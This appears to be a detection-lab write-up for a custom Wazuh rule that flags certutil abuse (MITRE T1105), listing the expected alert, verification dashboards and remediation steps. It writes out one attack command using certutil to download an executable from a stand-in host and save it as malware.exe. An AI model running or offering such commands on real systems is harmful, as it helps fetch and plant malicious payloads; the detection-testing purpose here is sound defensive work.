# Certutil Abuse Detection

## Overview

Certutil is a legitimate Windows utility that attackers commonly abuse to download or decode malicious payloads.

---

# MITRE ATT&CK

| Technique | Description |
|-----------|-------------|
| T1105 | Ingress Tool Transfer |

---

# Attack Command

```cmd
certutil.exe -urlcache -split -f http://example.com/file.exe malware.exe
```

---

# Expected Detection

Rule ID

```
100104
```

Severity

```
Critical
```

---

# Verification

Verify the alert appears in:

- Windows Security Dashboard
- Threat Detection Dashboard

---



# Remediation

- Investigate downloaded file
- Review execution history
- Quarantine suspicious payload
- Verify file integrity

---

# Outcome

The Certutil execution successfully triggered the custom Wazuh detection rule.
